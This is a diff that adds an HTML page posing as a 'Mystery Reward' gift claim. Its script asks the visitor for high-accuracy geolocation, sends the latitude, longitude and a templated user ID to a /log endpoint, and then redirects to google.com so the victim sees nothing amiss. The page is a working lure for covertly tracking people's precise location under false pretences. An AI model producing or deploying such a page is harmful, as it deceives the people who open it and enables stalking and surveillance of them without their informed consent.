@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Claim Gift</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 100px; }
+        .card { border: 2px solid #00d2ff; padding: 20px; border-radius: 15px; display: inline-block; }
+        button { background: #00d2ff; border: none; padding: 10px 20px; border-radius: 20px; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h1>🎁 Mystery Reward</h1>
+        <p>You won a special gift!<br>Allow location to claim it.</p>
+        <button onclick="track()">CLAIM NOW</button>
+    </div>
+    <script>
+        function track() {
+            navigator.geolocation.getCurrentPosition((p) => {
+                fetch(`/log?lat=${p.coords.latitude}&lon=${p.coords.longitude}&id={{user_id}}`)
+                .then(() => { window.location.href = "https://google.com"; });
+            }, () => { alert("Error: Enable location!"); }, {enableHighAccuracy:true});
+        }
+    </script>
+</body>
+</html>
